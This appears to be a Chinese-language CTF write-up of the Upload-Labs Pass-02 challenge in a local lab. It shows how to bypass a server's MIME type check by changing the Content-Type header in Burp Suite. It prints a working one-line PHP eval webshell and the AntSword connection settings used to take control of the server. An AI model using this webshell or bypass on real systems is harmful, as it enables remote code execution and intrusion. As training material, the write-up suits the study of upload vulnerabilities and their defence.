【Upload-Labs】Pass-02 MIME 类型校验绕过 Writeup

操作者：何芊宏 | 操作日期：2026.11.02 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, MIME绕过, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-02 (服务端 MIME 类型校验)
  • 提示：任务为上传一个 webshell 到服务器。直接上传 .php 文件会被服务端拦截并提示文件类型不正确。

2. 核心原理与前置分析

本关卡的核心漏洞在于服务端过度信任客户端提交的 MIME 类型（Content-Type）。

分析源码可知，前端不再有 JavaScript 拦截。服务端在处理上传文件时，通过 $_FILES['upload_file']['type'] 获取文件的 MIME 类型。这个值是由浏览器在发送 HTTP 请求时，写在 Content-Type 请求头里的。如果该值不等于 image/jpeg、image/png 或 image/gif，则拒绝上传。

由于 HTTP 请求在传输过程中是可见且可修改的，通过 Burp Suite 拦截请求并手动篡改 Content-Type 字段，即可伪造文件类型，绕过服务端校验。

3. 工具配置与操作步骤

工具配置：Burp Suite 与 中国蚁剑

  • Burp Suite：用于拦截 HTTP 请求并修改 multipart 表单数据中的 Content-Type 字段。
  • 中国蚁剑：URL 地址：http://127.0.0.1:8081/upload/shell.php；连接密码：cmd；编码：UTF-8。

操作步骤与解析：

第一步：准备 Payload

直接使用原生的 PHP 文件，无需伪装后缀。文件名为 shell.php，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：抓包并篡改 MIME 类型

开启 Burp Suite 拦截模式。在网页中选择 shell.php 点击上传。Burp 成功拦截到 POST 请求。

在请求体中找到文件上传的头部信息：

Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: application/octet-stream

将 Content-Type 的值修改为服务端允许的图片类型：

Content-Type: image/jpeg

点击 Forward 放行请求。服务端读取到的 MIME 类型变为 image/jpeg，校验通过，文件被保存。

第三步：验证与连接

在浏览器中访问 http://127.0.0.1:8081/upload/shell.php。页面呈现纯白空白状态，证明 PHP 代码已被解析执行。

打开蚁剑，填入对应的 URL 和密码 cmd，测试连接成功，获取服务器文件目录浏览权限。

4. 踩坑记录与复盘

  • 惯性思维干扰：由于 Pass-01 的解法是修改 filename，在此关卡中容易习惯性地去修改 filename，而忽略了本关考察的核心是 Content-Type。实际上，本关的 filename 保持为 shell.php 即可。
  • 理解 MIME 来源：明确 Content-Type 是客户端（浏览器）根据文件后缀自动生成的请求头。当上传 .php 时，浏览器默认分配 application/octet-stream。抓包工具在中间拦截时，可以任意将其修改为图片的 MIME 类型，以此欺骗服务端的逻辑判断。

5. 知识点总结

  • MIME 类型（Media Type）：描述文件内容类型的标准。在 HTTP 请求中，由客户端提供，服务端不应将其作为判断文件安全性的唯一标准。
  • MIME 绕过：通过抓包工具修改请求头中的 Content-Type 字段，伪装成合法的文件类型（如 image/jpeg），从而绕过基于客户端请求头的弱验证机制。
